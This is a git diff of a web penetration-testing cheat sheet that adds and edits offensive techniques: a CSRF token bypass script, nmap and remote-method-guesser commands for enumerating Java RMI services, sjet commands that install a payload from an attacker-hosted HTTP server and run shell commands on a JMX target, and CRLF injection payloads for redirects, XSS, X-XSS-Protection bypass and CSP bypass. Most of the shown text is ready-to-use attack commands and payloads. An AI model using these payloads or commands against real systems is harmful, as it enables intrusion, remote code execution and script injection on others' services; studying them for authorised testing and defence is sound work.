@@ -934,8 +934,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 ### Bypass Token CSRF - Example
 -> csrf_token_bypass.html  
-```
-<script type="text/javascript">
+```<script type="text/javascript">
 
 function addUser(token)
 {
@@ -1104,10 +1103,21 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ## Insecure RMI
--> E.g.    
+-> Scan on default ports with nmap  
+```
+nmap -p 1090,1098,1099,1199,4443-4446,8999-9010,9999 -sV
+```
+-> remote-method-guesser  
+```
+rmg enum 172.17.0.2 9010
+```
+https://github.com/qtc-de/remote-method-guesser
+
+-> JMX Exploitation  
+E.g.   
 //Open port Java RMI 9991  
-`jython sjet.py 192.168.11.136 9991 password install http://192.168.11.132:8000 8000`  
-`jython sjet.py 192.168.11.136 9991 password command "ls -la"`  
+`jython sjet.py <target_host> 9991 password install http://<ip>:8000 8000`  
+`jython sjet.py <target_host> 9991 password command "ls -la"`  
 https://github.com/siberas/sjet  
 http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  
 
@@ -1172,11 +1182,28 @@ xhr.send(null);
 ```
 
 ## CRLF Injection
-  
+
+e.g.  
 -> Redirect via GET  
 `/%0d%0aLocation:attacker`  
 -> XSS via GET  
 `/%0d%0a%0d%0a<svg onload="alert(1)">`
+
+### XSS-Protection Bypass via CRLF
+```
+/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+```
+
+### CSP Bypass via CRLF
+```
+%0d%0aX-Content-Security-Policy: allow *%0d%0a%0d%0a
+%0d%0aX-Content-Security-Policy: allow *
+```
+
+### Template - Nuclei
+https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/crlf-injection.yaml
+
 
 ## Elasticsearch - API
 -> Extract info  
